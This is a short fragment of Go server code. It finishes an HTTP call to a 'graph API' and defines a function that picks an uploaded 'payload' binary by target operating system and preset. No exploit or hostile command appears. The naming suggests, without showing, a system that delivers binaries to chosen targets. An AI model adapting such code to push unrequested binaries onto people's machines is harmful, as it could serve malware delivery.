	req.Header.Set("Content-Type", "text/plain")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 202 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("graph API %d: %s", resp.StatusCode, b)
	}
	return nil
}

// findPayload scans payloadsDir for an uploaded file matching the given preset and OS.
// For macOS, any Mach-O binary qualifies because the Mac build serves all presets.
// For Windows/Linux, the file must match both platform and preset.
func (h *Handler) findPayload(preset, targetOS string) string {
	entries, err := os.ReadDir(h.payloadsDir)
	if err != nil {
		return ""
	}
	targetPlatform := map[string]string{
		"windows": "windows",
		"macos":   "mac",
		"linux":   "linux",
	}[targetOS]

	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		path := filepath.Join(h.payloadsDir, name)
		if detectPlatform(name, path) != targetPlatform {
			continue
		}
		// Mac binary is generic — it serves all presets.
		if targetOS == "macos" {
			return name
		}
		if detectPreset(name) == preset {
			return name
		}
	}
	return ""
}
